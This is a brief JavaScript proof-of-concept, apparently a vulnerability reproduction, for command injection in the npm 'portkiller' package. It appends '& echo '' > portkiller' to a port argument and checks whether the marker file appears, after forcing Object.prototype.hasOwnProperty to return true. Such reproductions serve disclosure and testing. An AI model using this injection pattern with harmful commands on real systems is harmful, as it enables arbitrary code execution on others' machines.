Object.prototype.hasOwnProperty = () => true;
const portkiller = require('portkiller');
const fs = require('fs');
const path = './portkiller';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
let file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
portkiller('4000 & echo \'\' > portkiller');
setTimeout(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, () => {
    });
}, 500);